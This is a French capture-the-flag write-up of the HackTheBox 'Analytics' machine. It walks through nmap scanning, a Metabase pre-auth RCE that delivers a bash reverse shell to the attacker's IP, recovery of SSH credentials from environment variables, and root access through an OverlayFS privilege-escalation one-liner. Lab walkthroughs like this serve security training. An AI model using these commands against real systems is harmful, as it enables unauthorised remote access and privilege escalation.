---
title:  "HacktheBox WriteUp : Analytics"
category: HackTheBox
tag: writeups
---
### Skills
- Nmap
- Metabase : CVE-2023-38646
- ubuntu 22.04 : CVE-2023-2640


### Scanner le réseau

On fait un scan rapide sur les 1000 premiers ports.

```console
$ nmap 10.10.11.233        
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Puis un plus détaillé sur les ports identifiés :

```console
$ nmap 10.10.11.233 -p 22,80 -sC -sV
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On explore le site et la seule chose intéressante qu'il y a est une page de login sur le nom de domaine `data.analytical.htb` (qu'on rajoute sur `/etc/hosts`).

<img src="/assets/images/WriteUps/HackTheBox/analytics/MetabaseLogin.png" width="300px" height="300px" style="display: block; margin: 0 auto"/>

En cherchant sur internet "Metabase exploit", on tombe sur la CVE ... et un [POC](https://github.com/m3m0o/metabase-pre-auth-rce-poc).

## Accès initial
On a l'explication du poc sur github, mais pour résumé :

<u>Côté attaquant - Utilisation du POC :</u>

```console
python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"
```
- On choisit la commande pour provoquer la connecter à notre machine en écoute (port 2222) : `bash -i >& /dev/tcp/10.10.16.24/2222 0>&1`. 
- On récupère le `token` dans le endpoint `/api/session/properties` comme indiqué dans le POC, donc à l'adresse `http://data.analytical.htb/api/session/properties` &rarr; 	setup-token: "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"

Ce qui donne :
```console
$ python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.16.24/2222 0>&1"
```

<u>Côté attaquant - nc en écoute :</u>
```console
$ nc -lvnp 2222
```

## Accès initial
Une fois connecté avec notre reverse shell, à ma grande surprise nous n'avons pas le flag user (aucun fichier présent).
Dans ce cas, nous commençons à regarder les variables d'environnement et on voit apparaître des identifiants, ceux-ci permettant de nous connecter par ssh avec l'utilisateur `metalytics` :


<img src="/assets/images/WriteUps/HackTheBox/analytics/envVariable.png" width="400px" height="300px" style="display: block; margin: 0 auto"/>

Credentials : `metalytics:An4lytics_ds20223#`

## Escalade de privilèges

On test les classiques : sudo -l, env, uname -a, linpeas..

Concernant la version de l'OS et le noyau on obtient ceci.
```console
metalytics@analytics:/tmp$ uname -a 
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

En cherchant sur google **"Ubuntu 22.04.3  exploit"**, on obtient les CVE suivante : CVE-2023-2640 & CVE-2023-32629
avec un [POC](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629).


On finit par utiliser l'exploit fournit dans le POC et on devient root :
```
metalytics@analytics:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'                                                 
root@analytics:/tmp# id                      
uid=0(root) gid=1000(metalytics) groups=1000(metalytics) 
```

## Ref
- [CVE-2023-38646](https://github.com/m3m0o/metabase-pre-auth-rce-poc)
- [CVE-2023-2640 & CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

